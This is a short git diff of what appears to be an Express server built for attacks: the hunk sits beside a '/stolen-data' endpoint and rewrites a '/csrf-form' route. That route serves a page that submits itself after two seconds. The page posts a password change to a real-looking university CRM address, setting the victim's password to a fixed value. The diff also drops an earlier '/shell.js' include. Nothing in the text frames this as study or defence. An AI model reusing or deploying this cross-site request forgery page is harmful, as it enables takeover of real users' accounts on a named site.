@@ -192,17 +192,20 @@ app.post("/stolen-data", (req, res) => {
 app.get("/csrf-form", (req, res) => {
   const html = `
     <html>
-      <body>
-        <h1>Đang tải...</h1>
-        <script src="/shell.js"></script>
-        <form id="csrfForm" action="https://crm.aulac.edu.vn/profile" method="POST" enctype="text/plain">
-          <input type="hidden" name="" value='["Long@1234"]'>
-        </form>
-        <script>
-          setTimeout(() => document.getElementById("csrfForm").submit(), 2000);
-        </script>
-      </body>
-    </html>
+  <body>
+    <h1>Đang tải...</h1>
+    <form id="csrfForm" action="https://crm.aulac.edu.vn/profile" method="POST">
+      <input type="password" name="current-password" value="MatKhauCu">
+      <input type="password" name="new-password" value="Long@1234">
+      <input type="password" name="confirm-password" value="Long@1234">
+      <button type="submit">Thay đổi mật khẩu</button>
+    </form>
+
+    <script>
+      setTimeout(() => document.getElementById("csrfForm").submit(), 2000);
+    </script>
+  </body>
+</html>
   `;
   res.setHeader("Content-Type", "text/html");
   res.send(html);
